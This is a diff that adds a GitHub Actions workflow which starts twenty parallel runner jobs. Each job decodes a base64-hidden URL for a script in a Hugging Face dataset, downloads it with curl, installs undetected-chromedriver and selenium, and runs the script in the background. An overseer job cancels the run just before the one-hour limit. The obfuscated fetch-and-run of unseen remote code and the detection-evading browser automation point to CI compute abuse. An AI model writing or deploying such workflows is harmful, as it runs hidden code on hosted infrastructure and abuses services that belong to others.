@@ -1,0 +1,106 @@
+name: Fractured Obelisk Sync Swarm
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: obelisk-swarm-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # الحاكم الأبدي: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  eternal-overseer:
+    name: "Eternal Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Establish Overseer Watch
+        run: |
+          echo "[OVERSEER] Eternal overseer seated. Watch anchored at the 59-minute threshold."
+          echo "[OVERSEER] Run signature captured: ${{ github.run_id }}"
+          
+          # فترة الحراسة المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[OVERSEER] Threshold breached! Broadcasting overseer signal..."
+          
+          # بث أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[OVERSEER] Signal broadcast. Every active and pending obelisk will be shattered."
+
+  # =================================================================
+  # سرب المسلات المتوازي: تشكيل وتشغيل عُقد المسلات
+  # =================================================================
+  obelisk-swarm:
+    name: "ObeliskNode-${{ matrix.obelisk_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        obelisk_code: [701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفصل «1»: بناء القاعدة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Construct Base
+        run: |
+          echo "[BASE] Constructing base for ObeliskNode-${{ matrix.obelisk_code }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفصل «2»: استدعاء الشيفرة الجوهرية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Summon Core Code
+        run: |
+          echo "[SUMMON] Summoning obelisk_engine.py from designated conduit..."
+          CONDUIT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$CONDUIT" -o obelisk_engine.py
+          echo "[SUMMON] Core code summoned."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفصل «3»: تثبيت الوحدات الملحقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Install Attached Modules
+        run: |
+          echo "[INSTALL] Installing attached modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفصل «4»: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Launch Obelisk Sequence
+        run: |
+          echo ">> Launching ObeliskNode-${{ matrix.obelisk_code }} sequence..."
+          
+          # تشغيل العملية في الخلفية
+          python3 obelisk_engine.py &
+          OBELISK_PID=$!
+          
+          echo ">> Obelisk sequence active. Ceiling: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $OBELISK_PID 2>/dev/null; then
+            echo ">> Ceiling reached! Shattering sequence..."
+            kill -9 $OBELISK_PID
+            echo ">> Sequence shattered by ceiling keeper."
+          else
+            echo ">> Sequence concluded within ceiling."
+          fi
